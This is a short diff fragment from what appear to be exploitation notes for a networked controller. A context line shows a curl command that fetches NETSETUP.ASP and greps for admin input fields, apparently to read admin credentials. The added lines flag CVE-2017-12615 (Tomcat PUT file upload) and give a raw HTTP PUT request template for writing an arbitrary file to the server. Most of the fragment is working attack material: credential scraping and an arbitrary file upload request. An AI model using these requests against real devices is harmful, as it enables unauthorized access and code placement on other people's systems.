@@ -8,3 +8,13 @@ frequently telnet directly into your controller to help support you."
 
 
 curl http://IP:PORT/NETSETUP.ASP | grep input | grep admin
+
+** Some instance are vuln to TOMCAT PUT FILE VULN CVE-2017-12615 **
+
+----
+PUT /myfile.asp/ HTTP/1.0
+Host: IP
+Connection: close
+
+file content
+---
